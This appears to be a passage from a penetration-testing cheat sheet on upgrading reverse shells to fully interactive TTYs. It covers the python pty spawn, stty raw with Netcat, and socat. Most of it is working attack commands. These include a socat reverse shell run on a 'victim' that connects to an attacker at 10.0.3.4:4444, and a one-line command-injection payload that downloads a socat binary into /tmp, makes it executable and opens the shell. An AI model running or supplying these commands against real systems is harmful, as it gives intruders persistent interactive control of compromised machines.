### Python pty module

````bash
python -c 'import pty; pty.spawn("/bin/bash")'
````

### Upgrading Netcat with magic

First use python.

````bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
````
Once bash is running in the PTY, background the shell with ``Ctrl-Z``
````bash
# In Kali
$ stty raw -echo
$ fg
````

Then you will be back into the reverse shell.

```bash
# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

### Using socat

[socat](http://www.dest-unreach.org/socat/doc/socat.html) is like netcat on steroids and is a very powerfull networking swiss-army knife. Socat can be used to pass full TTY’s over TCP connections.

If `socat` is installed on the victim server, you can launch a reverse shell with it. You _must_ catch the connection with `socat` as well to get the full functions.

The following commands will yield a fully interactive TTY reverse shell:

**On Kali (listen)**:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On Victim (launch)**:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

If socat isn’t installed, you’re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

With a command injection vuln, it’s possible to download the correct architecture `socat` binary to a writable directoy, chmod it, then execute a reverse shell in one line:

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

On Kali, you’ll catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc. It’s a full terminal. Pretty sweet.